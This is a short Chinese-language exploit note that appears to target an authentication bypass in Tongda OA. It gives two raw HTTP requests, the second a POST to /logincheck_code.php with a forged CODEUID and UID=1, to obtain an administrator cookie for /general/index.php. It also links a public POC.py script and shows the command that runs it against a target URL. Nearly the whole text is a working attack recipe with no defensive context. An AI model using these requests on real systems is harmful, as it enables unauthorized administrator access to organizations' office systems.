## 0x00 发送第一个请求包

```
GET /general/login_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
```

## 0x01 发送第二个请求包


```
POST /logincheck_code.php HTTP/1.1
Host: 
User-Agent: Go-http-client/1.1
Content-Length: 56
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1


```

## 获取cookie后访问管理员页面 /general/index.php
------------

可以利用工具获取cookie
借助工具：https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py

python3 POC.py -v 2017 -url http://xxxxxxxxxxxxxxxxxxxxxx
